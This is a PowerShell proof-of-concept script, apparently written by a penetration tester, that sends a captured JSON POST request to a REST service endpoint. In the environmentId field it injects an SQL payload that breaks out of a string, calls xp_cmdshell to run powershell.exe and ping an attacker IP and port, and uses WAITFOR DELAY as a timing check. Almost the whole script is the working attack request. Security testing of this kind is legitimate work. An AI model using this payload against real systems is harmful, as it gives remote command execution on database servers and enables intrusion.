```powershell
# Define the URL for the request
$url = "<https://www.example.com/Services.REST/target.svc/Operation_Name>"

# Define the headers for the request
# Copy/paste from packet capture 
# Note: PowerShell will not take "Connection" = "keep-alive"; this must be removed from the header
$headers = @{
    "Host" = "<target_url>"
    "Accept-Encoding" = "gzip, deflate, br"
    "Accept" = "application/json"
    "Accept-Language" = "en-US;q=0.9,en;q=0.8"
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36"
    "Cache-Control" = "max-age=0"
    "Origin" = "<target_url>"
    "Referer" = "<target_referer_url>"
    "Content-Type" = "application/json"
    "Sec-CH-UA" = '".Not/A)Brand";v="99", "Google Chrome";v="125", "Chromium";v="125"'
    "Sec-CH-UA-Platform" = "Windows"
    "Sec-CH-UA-Mobile" = "?0"
}

# Define the JSON body for the POST request
# Copy/paste from packet capture
$body = @{
    moduleName        = "Administration"
    moduleType        = 1
    subModuleName     = "Dashboard"
    subModuleType     = 11
    featureName       = "Dashboard"
    environmentId     = "' ; IF (1=1) BEGIN EXEC xp_cmdshell 'powershell.exe -c ping <attack_ip>:<attack_port>'; END; WAITFOR DELAY '0:0:5' --"
    context           = @{
        callerReference    = "REST-SAMPLE"
        environmentSettings = @{
            id                      = ""
            name                    = ""
            mgmtDbName              = ""
            mgmtDbSqlInstanceName   = ""
            licenseEdition          = 4
        }
    }
} | ConvertTo-Json

# Make the POST request using Invoke-WebRequest
$response = Invoke-WebRequest -Uri $url -UseDefaultCredentials -Method POST -Headers $headers -Body $body -ContentType "application/json"

# Output the response for review
$response.Content
```